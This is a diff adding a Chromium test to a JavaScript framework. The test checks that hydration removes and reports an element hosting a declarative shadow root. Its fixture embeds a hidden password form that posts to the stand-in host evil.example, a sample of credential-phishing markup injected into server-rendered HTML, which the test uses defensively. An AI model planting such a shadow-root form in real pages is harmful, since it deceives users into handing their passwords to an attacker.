@@ -81,3 +81,56 @@ test('Chromium storefront server entry points', { timeout: 90_000 }, async t => 
     await browser.close();
   }
 });
+
+// A declarative shadow root (`<template shadowrootmode="open">`, which only a
+// browser's document parser turns into a shadow root) on an element the walk
+// claims is not what a client render makes: what the page shows is the shadow
+// tree, not the children the walk would hydrate. Both clients replace the
+// element and report it, also when it sits inside a subtree the compiled
+// client adopts whole.
+test('Chromium: hydration replaces an element hosting a declarative shadow root', { timeout: 60_000 }, async () => {
+  const { compileJSX } = await import('../test-utils/compile.js');
+  const shadow = '<template shadowrootmode="open"><form action="https://evil.example/"><input name="password" type="password"><button>Sign in</button></form></template>';
+  const page = `<main><h1>Account</h1><section><div class="card">${shadow}<p>Balance: 10</p></div></section></main>`;
+  const sources = {
+    h: `import { h, hydrate } from 'what-framework';
+      const tree = h('main', null, h('h1', null, 'Account'), h('section', null, h('div', { class: 'card' }, h('p', null, 'Balance: 10'))));
+      window.result = () => { const reports = []; hydrate(tree, document.getElementById('app'), { onHydrationError: (r) => reports.push(r.kind) }); return reports; };`,
+    compiled: compileJSX(`import { hydrate } from 'what-framework';
+      const Page = () => <main><h1>Account</h1><section><div class="card"><p>Balance: 10</p></div></section></main>;
+      window.result = () => { const reports = []; hydrate(<Page />, document.getElementById('app'), { onHydrationError: (r) => reports.push(r.kind) }); return reports; };`,
+    { pluginOptions: { hydratable: true } }),
+  };
+  const browser = await launchBrowser();
+  try {
+    for (const [name, source] of Object.entries(sources)) {
+      const client = (await build({
+        stdin: { contents: source, resolveDir: repo, loader: 'js' },
+        absWorkingDir: repo, bundle: true, write: false, platform: 'browser', format: 'esm',
+        define: { __WHAT_DEV__: 'false' }, conditions: ['production', 'browser'],
+      })).outputFiles[0].text;
+      const tab = await browser.newPage();
+      try {
+        await tab.route('**/*', route => {
+          const url = route.request().url();
+          if (url === 'http://shadow.test/') return route.fulfill({ contentType: 'text/html', body: `<!doctype html><body><div id="app">${page}</div></body>` });
+          if (url === 'http://shadow.test/client.js') return route.fulfill({ contentType: 'text/javascript', body: client });
+          return route.abort();
+        });
+        await tab.goto('http://shadow.test/');
+        assert.equal(await tab.evaluate(() => document.querySelector('.card').shadowRoot !== null), true, `${name}: precondition, the parser attached the shadow root`);
+        await tab.addScriptTag({ url: 'http://shadow.test/client.js', type: 'module' });
+        await tab.waitForFunction(() => typeof window.result === 'function');
+        const reports = await tab.evaluate(() => window.result());
+        const after = await tab.evaluate(() => ({ shadow: document.querySelector('.card').shadowRoot !== null, html: document.getElementById('app').innerHTML.replace(/<!--[^>]*-->/g, '') }));
+        assert.deepEqual(reports, ['shadow-root'], name);
+        assert.equal(after.shadow, false, `${name}: no shadow root survives`);
+        assert.equal(after.html, '<main><h1>Account</h1><section><div class="card"><p>Balance: 10</p></div></section></main>', name);
+      } finally {
+        await tab.close();
+      }
+    }
+  } finally {
+    await browser.close();
+  }
+});
